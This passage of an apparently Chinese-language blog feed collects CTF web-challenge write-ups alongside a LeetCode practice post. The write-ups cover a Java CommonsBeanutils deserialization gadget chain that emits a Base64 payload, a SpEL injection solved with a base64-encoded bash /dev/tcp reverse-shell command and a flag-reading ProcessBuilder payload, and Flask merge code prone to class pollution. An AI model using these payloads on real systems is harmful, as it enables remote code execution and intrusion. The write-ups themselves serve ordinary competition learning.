class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(beanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br> <br>        <span class="hljs-type">byte</span>[] result=serialize(priorityQueue);<br>        System.out.println(Base64.getEncoder().encodeToString(result));<br> <br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ByteArrayOutputStream byteArrayOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªCBçš„å†™æ³•å’Œå½“æ—¶è·ŸDBå¸ˆå‚…å­¦çš„é‚£ä¸ªæœ‰ä¸€ç‚¹ç‚¹ä¸åŒï¼Œå¤šäº†è¿™å‡ ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br></code></pre></td></tr></table></figure><p>å…¶å®ç›®æ ‡è¿˜æ˜¯ä¿è¯<code>add</code>çš„æ—¶å€™ä¸æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥æ”¾äº†å‡çš„<code>queue</code>å’Œ<code>comparator</code>è¿›å»ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p><h2 id="CISCN2023ååŒ—-normal-snake-æœªå®Œæˆ"><a href="#CISCN2023ååŒ—-normal-snake-æœªå®Œæˆ" class="headerlink" title="[CISCN2023ååŒ—]normal_snake[æœªå®Œæˆ]"></a>[CISCN2023ååŒ—]normal_snake[æœªå®Œæˆ]</h2><p><code>pom.xml</code>å­˜åœ¨ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.vaadin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>vaadin-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.7.14<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>IndexController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">```<br><br><br><br>## [D^3CTF <span class="hljs-number">2022</span>] shorter<br><br>```java<br><span class="hljs-comment">//MainController.java</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainController</span> &#123;<br>   <span class="hljs-meta">@GetMapping(&#123;&quot;/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@PostMapping(&#123;&quot;/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String baseStr)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      <span class="hljs-keyword">if</span> (baseStr.length() &gt;= <span class="hljs-number">1956</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;too long&quot;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(baseStr);<br>         <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode);<br>         <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>         objectInputStream.readObject();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>      &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//spel.java</span><br><span class="hljs-meta">@RestController</span> <span class="hljs-comment">// å£°æ˜è¯¥ç±»æ˜¯ä¸€ä¸ª REST æ§åˆ¶å™¨ï¼Œå¯ä»¥å¤„ç† HTTP è¯·æ±‚å’Œå“åº”</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/SPEL&quot;&#125;)</span> <span class="hljs-comment">// æ˜ å°„å¤„ç†è¯¥ç±»çš„è¯·æ±‚è·¯å¾„ä¸º &quot;/SPEL&quot;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spel</span> &#123; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªåä¸º spel çš„ç±»</span><br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/vul&quot;&#125;)</span> <span class="hljs-comment">// æ˜ å°„å¤„ç† &quot;/SPEL/vul&quot; è·¯å¾„çš„è¯·æ±‚</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">spelVul</span><span class="hljs-params">(String ex)</span> &#123; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªåä¸º spelVul çš„æ–¹æ³•ï¼Œæ¥æ”¶ä¸€ä¸ªåä¸º ex çš„å‚æ•°</span><br>      <span class="hljs-comment">// åˆ›å»º SpEL è¡¨è¾¾å¼è§£æå™¨</span><br>      <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>      <span class="hljs-comment">// åˆ›å»º SpEL è¡¨è¾¾å¼çš„è¯„ä¼°ä¸Šä¸‹æ–‡</span><br>      <span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">evaluationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>      <span class="hljs-comment">// è§£æå¹¶æ‰§è¡Œä¼ å…¥çš„ SpEL è¡¨è¾¾å¼ï¼Œè·å–ç»“æœï¼Œå¹¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span><br>      <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(ex).getValue(evaluationContext).toString();<br>      <span class="hljs-comment">// å°†ç»“æœæ‰“å°åˆ°æ§åˆ¶å°</span><br>      System.out.println(result);<br>      <span class="hljs-comment">// è¿”å›ç»“æœå­—ç¬¦ä¸²</span><br>      <span class="hljs-keyword">return</span> result;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å»æ˜¯ä¸ªæŠ¥é”™é¡µé¢ï¼š</p><p><img src="/img/polarspel1.png" alt="polarspel1"></p><p><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">å‚è€ƒæ–‡ç« </a></p><p>Spring Boot æ¡†æ¶Whitelabel Error Page SpELæ³¨å…¥çš„åŸå› å°±æ˜¯ç³»ç»ŸæŠ¥é”™é¡µé¢æŠŠç”¨æˆ·çš„è¾“å…¥å½“åšäº†è¡¨è¾¾å¼æ¥æ‰§è¡Œã€‚ä½†è¿™é¢˜æ²¡å•¥èŠ±èŠ±ç»•ç»•çš„ï¼Œç›´æ¥å°±èƒ½æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(ex).getValue(evaluationContext).toString();<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥å°†ç”¨æˆ·çš„è¾“å…¥<code>ex</code>å½“ä½œè¡¨è¾¾å¼å†…å®¹è¿›è¡Œè§£æã€‚</p><p>è¾“å…¥ä¸€ä¸ªç®€å•çš„ä¹˜æ³•è¿ç®—<code>2*2</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›çš„å€¼æ˜¯ç»è¿‡è§£æåçš„<code>4</code>ï¼š</p><p><img src="/img/polarjava.png" alt="polarjava"></p><p>ä¸¤ç§è§£æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// [shell_b64_encode] ä¸º bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 çš„ base64 ç¼–ç ï¼Œæ³¨æ„ IP é¡»ä¸ºå¤–ç½‘åœ°å€ï¼Œä¸”ç›®æ ‡èƒ½å‡ºç½‘</span><br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&#125;|[shell_b64_encode]&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)<br><span class="hljs-comment">// è¯»å– flag</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat /app/flag.txt&quot;</span>&#125;).start().getInputStream(), <span class="hljs-string">&quot;utf8&quot;</span>)).readLine()<br></code></pre></td></tr></table></figure><p><img src="/img/polarspel2.png" alt="polarspel2"></p><h2 id="backendservice"><a href="#backendservice" class="headerlink" title="backendservice"></a>backendservice</h2>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leetcodeåšé¢˜è®°å½•_2</title>
    <link href="/2024/04/10/2024-4-10-Leetcode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/"/>
    <url>/2024/04/10/2024-4-10-Leetcode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/</url>
    
    <content type="html"><![CDATA[<p>å”‰ï¼Œå­¦</p><span id="more"></span><h3 id="æœ€é•¿å…¬å…±å‰ç¼€"><a href="#æœ€é•¿å…¬å…±å‰ç¼€" class="headerlink" title="æœ€é•¿å…¬å…±å‰ç¼€"></a>æœ€é•¿å…¬å…±å‰ç¼€</h3><p>ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥æŸ¥æ‰¾å­—ç¬¦ä¸²æ•°ç»„ä¸­çš„æœ€é•¿å…¬å…±å‰ç¼€ã€‚</p><p>å¦‚æœä¸å­˜åœ¨å…¬å…±å‰ç¼€ï¼Œè¿”å›ç©ºå­—ç¬¦ä¸² <code>&quot;&quot;</code>ã€‚</p><p><strong>ç¤ºä¾‹ 1ï¼š</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">è¾“å…¥ï¼š<span class="hljs-keyword">strs</span> = [<span class="hljs-string">&quot;flower&quot;</span>,<span class="hljs-string">&quot;flow&quot;</span>,<span class="hljs-string">&quot;flight&quot;</span>]<br>è¾“å‡ºï¼š<span class="hljs-string">&quot;fl&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2ï¼š</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">è¾“å…¥ï¼š<span class="hljs-keyword">strs</span> = [<span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;racecar&quot;</span>,<span class="hljs-string">&quot;car&quot;</span>]<br>è¾“å‡ºï¼š<span class="hljs-string">&quot;&quot;</span><br>è§£é‡Šï¼šè¾“å…¥ä¸å­˜åœ¨å…¬å…±å‰ç¼€ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getshuzu</span>(<span class="hljs-params">self</span>):<br>        user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¾“å…¥å†…å®¹ï¼Œä»¥é€—å·åˆ†éš”ï¼š&quot;</span>)<br>        input_list = user_input.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¾“å…¥çš„æ•°ç»„ä¸ºï¼š<span class="hljs-subst">&#123;input_list&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> input_list<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">findqianzhui</span>(<span class="hljs-params">self,input_list</span>):<br><br>        min_len = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> input_list)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(min_len):<br>            current_char = input_list[<span class="hljs-number">0</span>][i]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(s[i] == current_char <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> input_list):<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(input_list[<span class="hljs-number">0</span>][:i])<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>solution = Solution()<br>shuzu = solution.getshuzu()<br>qianzhui = solution.findqianzhui(shuzu)<br></code></pre></td></tr></table></figure><h3 id="æœ‰æ•ˆçš„æ‹¬å·"><a href="#æœ‰æ•ˆçš„æ‹¬å·" class="headerlink" title="æœ‰æ•ˆçš„æ‹¬å·"></a>æœ‰æ•ˆçš„æ‹¬å·</h3><p>ç»™å®šä¸€ä¸ªåªåŒ…æ‹¬ <code>&#39;(&#39;</code>ï¼Œ<code>&#39;)&#39;</code>ï¼Œ<code>&#39;&#123;&#39;</code>ï¼Œ<code>&#39;&#125;&#39;</code>ï¼Œ<code>&#39;[&#39;</code>ï¼Œ<code>&#39;]&#39;</code> çš„å­—ç¬¦ä¸² <code>s</code> ï¼Œåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆã€‚</p><p>æœ‰æ•ˆå­—ç¬¦ä¸²éœ€æ»¡è¶³ï¼š</p><ol><li>å·¦æ‹¬å·å¿…é¡»ç”¨ç›¸åŒç±»å‹çš„å³æ‹¬å·é—­åˆã€‚</li><li>å·¦æ‹¬å·å¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºé—­åˆã€‚</li><li>æ¯ä¸ªå³æ‹¬å·éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç›¸åŒç±»å‹çš„å·¦æ‹¬å·ã€‚</li></ol><p><strong>ç¤ºä¾‹ 1ï¼š</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix">è¾“å…¥ï¼š<span class="hljs-attr">s</span> = <span class="hljs-string">&quot;()&quot;</span><br>è¾“å‡ºï¼š<span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>è¿™é¢˜æ²¡åšå‡ºæ¥ã€‚ã€‚æƒ³éº»çƒ¦äº†ï¼Œçœ‹äº†åˆ«äººçš„è§£æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">isValid</span>(<span class="hljs-params">self, s</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            temp = s.replace(<span class="hljs-string">&#x27;()&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;[]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> temp == <span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">elif</span> temp == s:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                s = temp<br></code></pre></td></tr></table></figure><p>æ€è·¯å°±æ˜¯ä¸€å±‚ä¸€å±‚æŠŠæ‹¬å·æ¶ˆæ‰ã€‚æˆ‘å½“æ—¶æƒ³çš„æ˜¯éå†sï¼Œç„¶åå¦‚æœ<code>(</code>çš„ä¸‹ä¸€ä½æ˜¯<code>)</code>ï¼Œ<code>&#123;</code>çš„ä¸‹ä¸€ä½æ˜¯<code>&#125;</code>ç­‰ç­‰å°±ç›´æ¥æ›¿æ¢æˆç©ºã€‚ã€‚</p><h3 id="åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨"><a href="#åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨" class="headerlink" title="åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨"></a>åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨</h3><p>å°†ä¸¤ä¸ªå‡åºé“¾è¡¨åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„ <strong>å‡åº</strong> é“¾è¡¨å¹¶è¿”å›ã€‚æ–°é“¾è¡¨æ˜¯é€šè¿‡æ‹¼æ¥ç»™å®šçš„ä¸¤ä¸ªé“¾è¡¨çš„æ‰€æœ‰èŠ‚ç‚¹ç»„æˆçš„ã€‚</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">è¾“å…¥ï¼šl1 = <span class="hljs-comment">[1,2,4]</span>, l2 = <span class="hljs-comment">[1,3,4]</span><br>è¾“å‡ºï¼š<span class="hljs-comment">[1,1,2,3,4,4]</span><br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2ï¼š</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">è¾“å…¥ï¼šl1 = <span class="hljs-comment">[]</span>, l2 = <span class="hljs-comment">[]</span><br>è¾“å‡ºï¼š<span class="hljs-comment">[]</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mergeTwoLists</span>(<span class="hljs-params">self, l1: ListNode, l2: ListNode</span>) -&gt; ListNode:<br>        <span class="hljs-keyword">if</span> l1 <span class="hljs-keyword">and</span> l2:<br>            <span class="hljs-keyword">if</span> l1.val &gt; l2.val: l1, l2 = l2, l1<br>            l1.<span class="hljs-built_in">next</span> = self.mergeTwoLists(l1.<span class="hljs-built_in">next</span>, l2)<br>        <span class="hljs-keyword">return</span> l1 <span class="hljs-keyword">or</span> l2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(æœªå®Œæˆ)DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›_web</title>
    <link href="/2024/03/01/DASCTF-2023-&amp;-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B_web/"/>
    <url>/2024/03/01/DASCTF-2023-&amp;-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B_web/</url>
    
    <content type="html"><![CDATA[<p>åšé¢˜è®°å½•</p><span id="more"></span><h2 id="ez-flask"><a href="#ez-flask" class="headerlink" title="ez_flask"></a>ez_flask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> black_list<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">user</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.username = <span class="hljs-string">&quot;&quot;</span><br>        self.password = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-keyword">if</span> self.username == data[<span class="hljs-string">&#x27;username&#x27;</span>] <span class="hljs-keyword">and</span> self.password == data[<span class="hljs-string">&#x27;password&#x27;</span>]:<br>            <span class="hljs-keyword">return</span> 